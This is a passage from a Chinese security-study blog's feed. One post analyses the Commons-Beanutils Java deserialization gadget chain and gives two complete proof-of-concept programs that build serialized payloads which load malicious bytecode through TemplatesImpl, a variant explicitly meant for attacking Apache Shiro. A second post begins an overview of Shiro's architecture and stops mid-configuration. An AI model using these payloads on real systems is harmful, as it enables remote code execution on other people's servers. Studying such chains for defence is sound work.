<code>getProperty()</code> ，接收两个参数 bean （类对象）和 name（属性名），方法会返回这个类的这个属性的值。其实就是用反射的方式调用这个JavaBean里的get方法</p><pre class="language-java" data-language="java"><code class="language-java">&#x2F;&#x2F;test.javapackage org.cb1;import org.apache.commons.beanutils.PropertyUtils;import java.lang.reflect.InvocationTargetException;public class test &#123;    public static void main(String[] args) throws InvocationTargetException, IllegalAccessException, NoSuchMethodException &#123;        Object a &#x3D; PropertyUtils.getProperty(new javabean(), &quot;a&quot;);        System.out.println(a);    &#125;&#125;&#x2F;&#x2F;JavaBeanpackage org.cb1;public class javabean &#123;    private int a &#x3D; 22222;    private String b &#x3D; &quot;aaa&quot;;    public int getA() &#123;        return a;    &#125;    public void setA(int a) &#123;        this.a &#x3D; a;    &#125;    public String getB() &#123;        return b;    &#125;    public void setB(String b) &#123;        this.b &#x3D; b;    &#125;&#125;</code></pre><h2 id="BeanComparator"><a href="#BeanComparator" class="headerlink" title="BeanComparator"></a>BeanComparator</h2><p>BeanComparator 是 commons-beanutils 提供的用来比较两个 JavaBean 是否相等的类，其实现了java.util.Comparator 接口。</p><p>BeanComparator 在初始化时可以指定 property 属性名称和 comparator 对比器，如果不指定，则默认是 ComparableComparator 。</p><p>BeanComparator 的 compare 方法接收两个对象，分别调用 <code>PropertyUtils.getProperty()</code> 方法获取两个对象的 property 属性的值，然后调用 <code>internalCompare()</code> 方法调用实例化时初始化的 comparator 的 compare 方法进行比较。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230428215653493.png" alt="image-20230428215653493"></p><p>下个断点调试一下可以看见它最终还是调用了JavaBean里的getxx方法</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230428215817191.png" alt="image-20230428215817191"></p><h1 id="调用链（有CC依赖"><a href="#调用链（有CC依赖" class="headerlink" title="调用链（有CC依赖"></a>调用链（有CC依赖</h1><h2 id="TemplatesImpl类"><a href="#TemplatesImpl类" class="headerlink" title="TemplatesImpl类"></a>TemplatesImpl类</h2><p>CB链的反序列化链借助了CC3里提到的TemplatesImpl，通过动态类加载机制来执行恶意代码</p><p>回忆一下CC3的TemplatesImpl部分</p><p>从newTransformer方法</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230428221135879.png" alt="image-20230428221135879"></p><p>进入getTransletInstance</p><p>getTransletInstance还会有实例化的过程</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230428221154421.png" alt="image-20230428221154421"></p><p>然后再进入defineTransletClasses方法</p><p>在defineTransletClasses里调用了defineClass，实现加载类字节码并且实例化的目的</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230428222208457.png" alt="image-20230428222208457"></p><p>这就是CC3的利用</p><p>接下来让我们看看CB链里的利用</p><h2 id="CB包里的调用"><a href="#CB包里的调用" class="headerlink" title="CB包里的调用"></a>CB包里的调用</h2><p>之前我们说过，PropertyUtils类的getProperty方法会调用JavaBean里的get方式，去读取相应的属性值</p><p>传参方式是PropertyUtils.getProperty(Object bean,String name);</p><p>但是在调用的时候，并不会去判断我们传入的这个name属性是否存在，也就导致，我们可以利用这个方法去调用任意的以get开头的公共方法</p><p>巧的是TemplateImpl类里正好有一个这样的类，公共的、以get开头，而且还调用了newTransformer()，（巧了这不是</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230430152923679.png" alt="image-20230430152923679"></p><p>所以通过这个可以直接进CC3的链</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230430153325553.png" alt="image-20230430153325553"></p><p>然后要去找哪里调用了getProperty方法</p><p>这里是BeanComparator里的compare方法</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230430153718143.png" alt="image-20230430153718143"></p><p>很简单的逻辑，property可以在初始化的时候赋值</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230430153804089.png" alt="image-20230430153804089"></p><h2 id="反序列化的实现"><a href="#反序列化的实现" class="headerlink" title="反序列化的实现"></a>反序列化的实现</h2><p>这里又要涉及CC2的内容了</p><p>在CC2里，我们为了调用TransformingComparator的transform方法，从而调用TransformingComparator.transform方法找到了一条</p><p>在PriorityQueue类的siftDownUsingComparator方法调用compare的路线</p><p>虽然siftDownUsingComparator是私有的，但是在PriorityQueue类的readObject方法里调了heapify方法，heapify方法又调了siftDown，然后在siftDown里实现了对siftDownUsingComparator的调用</p><p>这条链在CB链里同样适用</p><p>唯一的问题就是在queue的赋值上</p><p>在CC2的时候，由于我们通过compare调用的是chainedTransformer，所以无论它的transform方法的参数输出的是什么，得到的都是我们设置的固定值，因此即使compare的两个参数都是空，也不会影响结果</p><p>而在CB链里，我们需要对compare的参数赋值，</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230430165153419.png" alt="image-20230430165153419"></p><p>从这里看出来o1和o2的值分别为x和c，</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230430165530043.png" alt="image-20230430165530043"></p><p>往前翻就能发现x的值就是heapify调siftDown的时候传的第二个参数</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230430165706622.png" alt="image-20230430165706622"></p><p>而c是在siftDownUsingComparator运算得到的</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230430165810775.png" alt="image-20230430165810775"></p><p>但其实根本上都是queue这个数组里边的内容</p><p>由于我们通过反射固定了size的值为2，所以这时候queue[i]其实就是queue[0]</p><p>queue[child]就是queue[1]</p><p>所以用反射赋值就行了</p><pre class="language-java" data-language="java"><code class="language-java">Field queue &#x3D; objects.getClass().getDeclaredField(&quot;queue&quot;);queue.setAccessible(true);queue.set(objects,new Object[]&#123;templates,1&#125;);</code></pre><p>另外，这里也有另一种赋值方式</p><pre class="language-java" data-language="java"><code class="language-java">Field field &#x3D; PriorityQueue.class.getDeclaredField(&quot;queue&quot;);field.setAccessible(true);Object[] objects &#x3D; (Object[]) field.get(queue);objects[0] &#x3D; tmpl;&#x2F;&#x2F;数组类型的值，通过反射的get方式得到的是一个引用类型的值，因此修改这个引用类型的值，也就相当于直接修改这个数组变量的值</code></pre><p>这里只让一个值为TemplatesImpl对象实例的原因一是执行命令执行一次就够了，不过更主要的就是执行完命令后compare会抛出异常被catch捕捉，也执行不了第二个命令了。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230430170306273.png" alt="image-20230430170306273"></p><p>问：既然只执行一次命令，那queue这个对象数组只赋值一个行不行</p><p>答：不行，因为假设queue这个只有一个值，那么在序列化的时候就会抛出数组越界的异常</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230430170537544.png" alt="image-20230430170537544"></p><p>poc为</p><pre class="language-java" data-language="java"><code class="language-java">public class test &#123;    public static &lt;T&gt; void main(String[] args) throws InvocationTargetException, IllegalAccessException, NoSuchMethodException, TransformerConfigurationException, NoSuchFieldException, IOException, ClassNotFoundException &#123;        TemplatesImpl templates &#x3D; new TemplatesImpl();        Field name &#x3D; templates.getClass().getDeclaredField(&quot;_name&quot;);        name.setAccessible(true);        name.set(templates,&quot;123&quot;);        &#x2F;&#x2F; _class赋值为null        Field classField &#x3D; templates.getClass().getDeclaredField(&quot;_class&quot;);        classField.setAccessible(true);        classField.set(templates,null);        &#x2F;&#x2F;加载恶意类的字节码        Field bytecodes &#x3D; templates.getClass().getDeclaredField(&quot;_bytecodes&quot;);        bytecodes.setAccessible(true);        byte[] code &#x3D; Files.readAllBytes(Paths.get(&quot;D:&#x2F;&#x2F;ctftools&#x2F;ctfscript&#x2F;javastudy&#x2F;CC&#x2F;src&#x2F;main&#x2F;java&#x2F;org&#x2F;cc3&#x2F;cmd.class&quot;));        &#x2F;&#x2F;转为二维数组        byte[][] codes &#x3D; &#123;code&#125;;        bytecodes.set(templates,codes);        &#x2F;&#x2F;_tfactory赋值        Field tfactory &#x3D; templates.getClass().getDeclaredField(&quot;_tfactory&quot;);        tfactory.setAccessible(true);        tfactory.set(templates,new TransformerFactoryImpl());&#x2F;&#x2F;        Object transletInstance &#x3D; PropertyUtils.getProperty(templates, &quot;outputProperties&quot;);        BeanComparator&lt;Object&gt; objectBeanComparator &#x3D; new BeanComparator&lt;&gt;(&quot;outputProperties&quot;);        PriorityQueue&lt;Object&gt; objects &#x3D; new PriorityQueue&lt;&gt;(objectBeanComparator);        Field size &#x3D; objects.getClass().getDeclaredField(&quot;size&quot;);        size.setAccessible(true);        size.set(objects,2);        Field queue &#x3D; objects.getClass().getDeclaredField(&quot;queue&quot;);        queue.setAccessible(true);        queue.set(objects,new Object[]&#123;templates,1&#125;);        file.serialize(objects,&quot;1.bin&quot;);        file.unserialize(&quot;1.bin&quot;);    &#125;&#125;</code></pre><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>调用链</p><pre class="language-txt" data-language="txt"><code class="language-txt">PriorityQueue.readObject()    BeanComparator.compare()            PropertyUtils.getProperty()                PropertyUtilsBean.getProperty()                    TemplatesImpl.getOutputProperties()</code></pre><p>依赖环境</p><pre class="language-txt" data-language="txt"><code class="language-txt">cc 3.21 ~ 4.4cb 1.90 ~ 1.94其他版本没试</code></pre><h1 id="调用链（无依赖"><a href="#调用链（无依赖" class="headerlink" title="调用链（无依赖"></a>调用链（无依赖</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>刚才的调用链，虽然很完美，但实际上还是依赖了CC链</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230430174452638.png" alt="image-20230430174452638"></p><p>这里就算把maven项目里的cc依赖去掉也不会报错的原因是因为cb本身就依赖着cc</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230430174544111.png" alt="image-20230430174544111"></p><p>但是在最开始的时候，我就提过<code>本来是在学shiro 的，发现shiro无依赖反序列化需要用CB链，所以就先学一下CB链</code></p><p>因为shiro本身需要添加的依赖有</p><ol><li>shiro-core、shiro-web，这是shiro本身的依赖</li><li>javax.servlet-api、jsp-api，这是JSP和Servlet的依赖，仅在编译阶段使用，因为Tomcat中自带这两个依赖</li><li>slf4j-api、slf4j-simple，这是为了显示shiro中的报错信息添加的依赖</li><li>commons-logging，这是shiro中用到的一个接口，不添加会爆<code>java.lang.ClassNotFoundException: org.apache.commons.logging.LogFactory</code>错误</li></ol><p>可以看到并没有CC依赖，所以，我们在进行shiro反序列化的时候就需要考虑不存在CC依赖的情况</p><p>这时候可以发现在shiro的依赖中，还带着CB，所以我们就可以尝试用CB链去打shiro反序列化</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230430174950619.png" alt="image-20230430174950619"></p><p>但实际上，直接打是会报错的。</p><blockquote><p>commons-beanutils本来依赖于commons-collections，但是在Shiro中，它的commons-beanutils虽然包含了一部分commons-collections的类，但却不全。这也导致，正常使用Shiro的时候不需要依赖于commons-collections，但反序列化利用的时候需要依赖于commons-collections。</p></blockquote><p>所以我们就需要找一个不需要依赖CC的CB链</p><h2 id="完善"><a href="#完善" class="headerlink" title="完善"></a>完善</h2><p>我们先来看一下CB链中的哪一部分调用了CC的内容</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230430175631340.png" alt="image-20230430175631340"></p><p>就是BeanComparator里的这个构造方法，当我们只传入一个property的时候，就会默认调用CC中ComparableComparator类的getInstance方法</p><p>所以要实现无依赖，就需要避免使用这个构造方法，但是property是必传的，所以只能用这个构造方法了</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230430175830790.png" alt="image-20230430175830790"></p><p>我们需要找一个类，满足以下条件</p><ul><li>实现<code>java.util.Comparator</code>接口</li><li>实现<code>java.io.Serializable</code>接口</li><li>Java、shiro或commons-beanutils自带，且兼容性强</li></ul><p>这里我们找到的是处于<code>java.lang.String</code>类下的一个内部私有类CaseInsensitiveComparator类</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230430180042241.png" alt="image-20230430180042241"></p><p>所以现在的poc是</p><pre class="language-java" data-language="java"><code class="language-java">public class test &#123;    public static &lt;T&gt; void main(String[] args) throws InvocationTargetException, IllegalAccessException, NoSuchMethodException, TransformerConfigurationException, NoSuchFieldException, IOException, ClassNotFoundException &#123;        TemplatesImpl templates &#x3D; new TemplatesImpl();        Field name &#x3D; templates.getClass().getDeclaredField(&quot;_name&quot;);        name.setAccessible(true);        name.set(templates,&quot;123&quot;);        &#x2F;&#x2F; _class赋值为null        Field classField &#x3D; templates.getClass().getDeclaredField(&quot;_class&quot;);        classField.setAccessible(true);        classField.set(templates,null);        &#x2F;&#x2F;加载恶意类的字节码        Field bytecodes &#x3D; templates.getClass().getDeclaredField(&quot;_bytecodes&quot;);        bytecodes.setAccessible(true);        byte[] code &#x3D; Files.readAllBytes(Paths.get(&quot;D:&#x2F;&#x2F;ctftools&#x2F;ctfscript&#x2F;javastudy&#x2F;CC&#x2F;src&#x2F;main&#x2F;java&#x2F;org&#x2F;cc3&#x2F;cmd.class&quot;));        &#x2F;&#x2F;转为二维数组        byte[][] codes &#x3D; &#123;code&#125;;        bytecodes.set(templates,codes);        &#x2F;&#x2F;_tfactory赋值        Field tfactory &#x3D; templates.getClass().getDeclaredField(&quot;_tfactory&quot;);        tfactory.setAccessible(true);        tfactory.set(templates,new TransformerFactoryImpl());&#x2F;&#x2F;        Object transletInstance &#x3D; PropertyUtils.getProperty(templates, &quot;outputProperties&quot;);        BeanComparator&lt;Object&gt; objectBeanComparator &#x3D; new BeanComparator&lt;&gt;(&quot;outputProperties&quot;,String.CASE_INSENSITIVE_ORDER);        PriorityQueue&lt;Object&gt; objects &#x3D; new PriorityQueue&lt;&gt;(objectBeanComparator);        Field size &#x3D; objects.getClass().getDeclaredField(&quot;size&quot;);        size.setAccessible(true);        size.set(objects,2);        Field queue &#x3D; objects.getClass().getDeclaredField(&quot;queue&quot;);        queue.setAccessible(true);        queue.set(objects,new Object[]&#123;templates,1&#125;);        file.serialize(objects,&quot;1.bin&quot;);        file.unserialize(&quot;1.bin&quot;);    &#125;&#125;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230430180306528.png" alt="image-20230430180306528"></p>]]></content>
      
      
      
        <tags>
            
            <tag> web学习 </tag>
            
            <tag> Java </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shiro安全</title>
      <link href="/2023/04/25/shiro%E5%AE%89%E5%85%A8/"/>
      <url>/2023/04/25/shiro%E5%AE%89%E5%85%A8/</url>
      
        <content type="html"><![CDATA[<p>这篇博客本来是打算只写一些shiro反序列化的内容的，但是发现了一篇关于shiro已知的所有cve的漏洞分析，因此就打算顺着这篇文章把shiro的漏洞都看一下，也是怕之后这个文章没了。其中的理论部分大概率和文章里的一模一样，一个是我觉得这个理论写的已经很足够了，另一个原因是我在这之前也没啥理论基础（</p><p><a href="https://su18.org/post/shiro-5/">参考文章</a></p><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p><a href="https://shiro.apache.org/">Apache Shiro</a> 是一个 Java 安全框架，包括如下功能和特性：</p><ul><li><a href="https://shiro.apache.org/authentication-features.html">Authentication</a>：身份认证/登陆，验证用户是不是拥有相应的身份。在 Shiro 中，所有的操作都是基于当前正在执行的用户，这里称之为一个 <code>Subject</code>，在用户任意代码位置都可以轻易取到这个<code>Subject</code>。Shiro 支持数据源，称之为 <code>Realms</code>，可以利用其连接 LDAP\AD\JDBC 等安全数据源，并支持使用自定义的 <code>Realms</code>，并可以同时使用一个或多个 <code>Realms</code> 对一个用户进行认证，认证过程可以使用配置文件配置，无需修改代码。同时，Shiro 还支持 RememberMe，记住后下次访问就无需登录。</li><li><a href="https://shiro.apache.org/authorization-features.html">Authorization</a>：授权，即权限验证，验证某个已认证的用户是否拥有某个权限。同样基于 <code>Subject</code>、支持多种 <code>Realms</code>。Shiro 支持 <code>Wildcard Permissions</code> ，也就是使用通配符来对权限验证进行建模，使权限配置简单易读。Shiro 支持基于 <code>Roles</code> 和基于 <code>Permissions</code> 两种方式的验证，可以根据需要进行使用。并且支持缓存产品的使用。</li><li><a href="https://shiro.apache.org/session-management-features.html">Session Manager</a>：会话管理，用户登陆后就是一次会话，在没有退出之前，它的所有信息都在会话中。Shiro 中的一切（包括会话和会话管理的所有方面）都是基于接口的，并使用 POJO 实现，因此可以使用任何与 JavaBeans 兼容的配置格式（如 JSON、YAML、Spring XML 或类似机制）轻松配置所有会话组件。Session 支持缓存集群的方式；还支持事件侦听器，允许在会话的生命周期内侦听生命周期事件，以执行相关逻辑。Shiro Sessions 保留发起会话的主机的 IP 地址，因此可以根据用户位置来执行不同逻辑。Shiro 对 Web 支持实现了 <code>HttpSession</code> 类及相关全部 API。也可以在 SSO 中使用。</li><li><a href="https://shiro.apache.org/cryptography-features.html">Cryptography</a>：加密，保护数据的安全性；Shiro 专注于使用公私钥对数据进行加密，以及对密码等数据进行不可逆的哈希。</li><li><a href="https://shiro.apache.org/permissions.html">Permissions</a>：用户权限；Shiro 将所有的操作都抽象为 Permission，并默认使用 <code>Wildcard Permissions</code> 来进行匹配。Shiro 支持实例级别的权限控制校验，例如<code>domain:action:instance</code>。</li><li><a href="https://shiro.apache.org/caching.html">Caching</a>：缓存，为了提高 Shiro 在业务中的性能表现。Shiro 的缓存支持基本上是一个封装的 API，由用户自行选择底层的缓存方式。缓存中有三个重要的接口 <code>CacheManager</code>/<code>Cache</code>/<code>CacheManagerAware</code> ，Shiro 提供了默认的 <code>MemoryConstrainedCacheManager</code> 等实现。</li></ul><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1460000037648601" alt="img"></p><h1 id="Shiro概要架构"><a href="#Shiro概要架构" class="headerlink" title="Shiro概要架构"></a>Shiro概要架构</h1><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1460000037648599" alt="img"></p><p>其中：</p><ol><li>Subject :主体对象，负责提交用户认证和授权信息。</li><li>SecurityManager：安全管理器，负责认证，授权等业务实现。</li><li>Realm：领域对象，负责从数据层获取业务数据。</li></ol><p>接下来详细说一下这三个组件</p><h2 id="SecurityManager"><a href="#SecurityManager" class="headerlink" title="SecurityManager"></a>SecurityManager</h2><p><code>org.apache.shiro.mgt.SecurityManager</code> 是 shiro 的一个核心接口，接口负责了一个 Subject 也就是“用户”的全部安全操作：</p><ul><li>接口本身定义了 <code>createSubject</code>、<code>login</code>、<code>logout</code> 三个方法用来创建 Subject、登陆和退出。</li><li>扩展了 <code>org.apache.shiro.authc.Authenticator</code> 接口，提供了 <code>authenticate</code> 方法用来进行认证。</li><li>扩展了 <code>org.apache.shiro.authz.Authorizer</code> 接口，提供了对 Permission 和 Role 的校验方法。包括 <code>has/is/check</code> 相关命名的方法。</li><li>扩展了 <code>org.apache.shiro.session.mgt.SessionManager</code> 接口，提供了 <code>start</code>、<code>getSession</code> 方法用来创建可获取会话。</li></ul><p>Shiro 为 SecurityManager 提供了一个包含了上述所有功能的默认实现类 <code>org.apache.shiro.mgt.DefaultSecurityManager</code>，中间继承了很多中间类，并逐层实现了相关的方法，继承关系如下图。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1640939549511.png" alt="img"></p><p>DefaultSecurityManager 中包含以下属性:</p><ul><li><code>subjectFactory</code>：默认使用 DefaultSubjectFactory，用来创建具体 Subject 实现类。</li><li><code>subjectDAO</code>：默认使用 DefaultSubjectDAO，用于将 Subject 中最近信息保存到 Session 里面。</li><li><code>rememberMeManager</code>：用于提供 RememberMe 相关功能。</li><li><code>sessionManager</code>：默认使用 DefaultSessionManager，Session 相关操作会委托给这个类。</li><li><code>authorizer</code>：默认使用 ModularRealmAuthorizer，用来配置授权策略。</li><li><code>authenticator</code>：默认使用 ModularRealmAuthenticator，用来配置认证策略。</li><li><code>realm</code>：对认证和授权的配置，由用户自行配置，包括 CasRealm、JdbcRealm 等。</li><li><code>cacheManager</code>：缓存管理，由用户自行配置，在认证和授权时先经过，用来提升认证授权速度。</li></ul><p>DefaultSecurityManager 还有一个子类，就是 <code>org.apache.shiro.web.mgt.DefaultWebSecurityManager</code>，这个类在 shiro-web 包中，是 Shiro 为 HTTP/SOAP 等 http 协议连接提供的实现类，这个类默认创建配置了 <code>org.apache.shiro.web.mgt.CookieRememberMeManager</code> 用来提供 RememberMe 相关功能。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230430213532419.png" alt="image-20230430213532419"></p><h2 id="Subject"><a href="#Subject" class="headerlink" title="Subject"></a>Subject</h2><p><code>org.apache.shiro.subject.Subject</code> 是一个接口，用来表示在 Shiro 中的一个用户。因为在太多组件中都使用了 <code>User</code> 的概念，所以 Shiro 故意避开了这个关键字，使用了 <code>Subject</code>。</p><p>Subject 接口同样提供了认证（login/logout）、授权（访问控制 has/is/check 方法）以及获取会话的能力。在应用程序中如果想要获取一个当前的 Subject，通常使用 <code>SecurityUtils.getSubject()</code> 方法即可。</p><p>单从方法的命名和覆盖的功能来看，Subject 提供了与 SecurityManager 非常近似的方法，用来执行相关权限校验操作。而实际上，Subject 接口在 core 包中的实现类 <code>org.apache.shiro.subject.support.DelegatingSubject</code> 本质上也就是一个 SecurityManager 的代理类。</p><p>DelegatingSubject 中保存了一个 transient 修饰的 SecurityManager 成员变量，在使用具体的校验方法时，实际上委托 SecurityManager 进行处理，如下图：</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1641263548553.png" alt="img"></p><p>DelegatingSubject 中不会保存和维持一个用户的“状态（角色/权限）”，恰恰相反，每次它都依赖于底层的实现组件 SecurityManager 进行检查和校验，因此通常会要求 SecurityManager 的实现类来提供一些缓存机制。所以本质上，Subject 也是一种“无状态”的实现。</p><h2 id="Realm"><a href="#Realm" class="headerlink" title="Realm"></a>Realm</h2><p>Realm 翻译过来是“领域、王国”，这里可以将其理解以为一种“有界的范围”，实际上就是权限和角色的认定。</p><p><code>org.apache.shiro.realm.Realm</code> 是 Shiro 中的一个接口，Shiro 通过 Realm 来访问指定应用的安全实体——用户、角色、权限等。一个 Realm 通常与一个数据源有 1 对 1 的对应关系，如关系型数据库、文件系统或者其他类似的资源。</p><p>因此，此接口的实现类，将使用特定于数据源的 API 来进行认证或授权，如 JDBC、文件IO、Hibernate/JPA 等等，官方将其解释为：特定于安全的 DAO 层。</p><p>在使用中，开发人员通常不会直接实现 Realm 接口，而是实现 Shiro 提供了一些相关功能的抽象类 AuthenticatingRealm/AuthorizingRealm，或者使用针对特定数据源提供的实现类如 JndiLdapRealm/JdbcRealm/PropertiesRealm/TextConfigurationRealm/IniRealm 等等。继承关系大概如下：</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1641266951968.png" alt="img"></p><p>较多情况下，开发人员会自行实现 <code>AuthorizingRealm</code> 类，并重写 <code>doGetAuthorizationInfo</code>/<code>doGetAuthenticationInfo</code> 方法来自行实现自身的认证和授权逻辑。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>通过对以上三个组件的了解，一次认证及授权的校验流程就形成了：</p><ol><li>应用程序通过获取当前访问的 Subject（也就是用户），并调用其相应校验方法；</li><li>Subject 将校验委托给 SecurityManager 进行判断；</li><li>SecurityManager 会调用 Realm 来获取信息来判断用户对应的角色能否进行操作。</li></ol><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p>这块跟开发关系有点大，感觉得单独学，所以我这里就直接ctrl cv了。</p><h2 id="web-xml"><a href="#web-xml" class="headerlink" title="web.xml"></a>web.xml</h2><p>在普通 web 项目中， Shiro 框架的注入是通过在 <code>web.xml</code> 中配置 Filter 的方式完成的。</p><p>在 Shiro 1.1 及之前的版本，通过配置 <code>IniShiroFilter</code> ，并在 <code>/WEB-INF/shiro.ini</code> 或 <code>classpath:shiro.ini</code> 中进行相应的权限配置。也可以指定配置文件路径，示例如下：</p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-name</span><span class="token punctuation">></span></span>ShiroFilter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-class</span><span class="token punctuation">></span></span>org.apache.shiro.web.servlet.IniShiroFilter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-class</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>init-param</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-name</span><span class="token punctuation">></span></span>configPath<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-value</span><span class="token punctuation">></span></span>/WEB-INF/anotherFile.ini<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-value</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>init-param</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter</span><span class="token punctuation">></span></span></code></pre><p>在 Shiro 1.2 及之后的版本，可以进行如下配置：</p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>listener</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>listener-class</span><span class="token punctuation">></span></span>org.apache.shiro.web.env.EnvironmentLoaderListener<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>listener-class</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>listener</span><span class="token punctuation">></span></span>...<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-name</span><span class="token punctuation">></span></span>ShiroFilter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-class</span><span class="token punctuation">></span></span>org.apache.shiro.web.servlet.ShiroFilter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-class</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-mapping</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-name</span><span class="token punctuation">></span></span>ShiroFilter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/*<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-mapping</span><span class="token punctuation">></span></span></code></pre><p>官方更推荐直接使用 <code>ShiroFilter</code> 类进行处理，并为 Web 应用程序配置了一个 Listener： <code>EnvironmentLoaderListener</code>。这是一个 <code>ServletContextListener</code> 的子类，会在初始化时将 WebEnvironment 的实现类注入到 ServletContext 中。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1641279281419.png" alt="img"></p><p>ShiroFilter 则使用 WebEnvironment 中的 WebSecurityManager 来作为当前 Shiro 上下文中的 SecurityManager。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1641279406501.png" alt="img"></p><p>在 Filter 处理流程中，ShiroFilter 继承的 <code>doFilter</code> 调用 <code>AbstractShiroFilter#doFilterInternal</code> 方法，会使用保存的 SecurityManager 创建 Subject 对象。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1641281248580.png" alt="img"></p><p>并调用其 execute 方法执行后续的校验逻辑。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1641280684013.png" alt="img"></p><p>默认情况下，<code>EnvironmentLoaderListener</code> 创建的 WebEnvironment 的实例是 IniWebEnvironment，是基于 INI 格式的配置文件，如果不想使用这个格式，可以通过自实现一个 IniWebEnvironment 的子类，用来处理自己定义的配置文件格式，并在 <code>web.xml</code> 中进行如下配置：</p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>context-param</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-name</span><span class="token punctuation">></span></span>shiroEnvironmentClass<span class="token tag"><span 